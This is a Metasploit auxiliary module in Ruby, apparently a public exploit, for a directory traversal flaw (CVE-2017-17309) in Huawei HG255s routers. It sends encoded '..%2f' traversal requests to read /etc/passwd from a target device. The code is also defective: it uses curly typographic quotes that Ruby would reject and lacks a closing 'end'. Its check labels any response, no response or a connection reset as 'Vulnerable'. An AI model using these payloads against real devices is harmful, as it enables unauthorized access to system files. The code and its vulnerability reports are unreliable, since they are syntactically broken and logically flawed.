##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#
##


class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient

   def initialize
       super(
           ‘Name’        => ‘Server Directory Traversal at Huawei HG255s’,
           ‘Version’     => ‘Huawei HG255s Firmware : V100R001C163B025SP02’,
           ‘Description’ => ‘Server Directory Traversal at Huawei HG255 by malicious GET requests’,
           ‘Author’      => ‘Ismail Tasdelen’,
           ‘License’     => MSF_LICENSE,
           ‘References’     =>
           [
              ['CVE', '2017-17309' ],
              ['URL', 'https://www.huawei.com/en/psirt/security-notices/huawei-sn-20170911-01-hg255s-en']
           ]
       )
       register_options(
           [
               Opt::RPORT(80)
           ], self.class
       )
   end

   def run
       urllist=[
           ‘/js/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd’,
           ‘/lib/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd’,
           ‘/res/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd’,
           ‘/css/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd’]

       urllist.each do |url|
           begin
               res = send_request_raw(
               {
                       ‘method’=> ‘GET’,
                       ‘uri’=> url
               })

               if res
                   print_good(“Vulnerable! for #{url}”)
               else
                   print_status(“Vulnerable(no response) detected for #{url}”)
               end
           rescue Errno::ECONNRESET
               print_status(“Vulnerable(rst) detected for #{url}”)
           rescue Exception
               print_error(“Connection failed.”)
           end
       end
   end
